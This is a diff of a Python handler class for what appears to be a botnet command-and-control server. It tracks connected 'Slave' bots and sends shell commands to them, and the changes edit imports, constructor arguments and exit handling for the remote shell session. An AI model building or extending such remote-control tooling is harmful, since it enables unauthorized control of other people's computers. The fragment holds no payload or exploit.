@@ -9,20 +9,19 @@ import queue
 import time
 
 # Project imports
-import server
-import interpreter
+# import server
+# import interpreter
 # from server import batchList, aliveConnections, deadConnections, clientAddressList
 # from interpreter import Interpreter
 
 class Handler(threading.Thread):
 
-    def __init__(self, client, client_address, alive, bot_id):
+    def __init__(self, client, client_address, bot_id):
         threading.Thread.__init__(self)
         self.client = client
         self.client_address = client_address
         self.ip = client_address[0]
         self.port = client_address[1]
-        self.isAlive = alive
         self.bot_id = bot_id
         self.info = [self.bot_id,self.ip,self.port]
 
@@ -35,7 +34,7 @@ class Handler(threading.Thread):
         print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
 
         # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
-        server.clientAddressList[self.bot_id] = self.client_address
+        #server.agentList[self.bot_id]
         # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
     
 
@@ -120,7 +119,10 @@ class Handler(threading.Thread):
                 try:
                     if(cmd.casefold() == 'quit' or cmd.casefold() == 'exit'):
                         self.client.send("exit\n".encode('utf-8'))
-                        time.sleep(0.3)
+                        print(f"[* BotHandler-Msg:ShellExec] Exiting. Please wait...")
+                        time.sleep(1.3)
+                        # self.client.send("exit\n".encode('utf-8'))
+                        # time.sleep(0.3)
                         recvVal = ((self.client.recv(2048)).decode('utf-8'))
                         print(recvVal.strip("\n"))
                         break
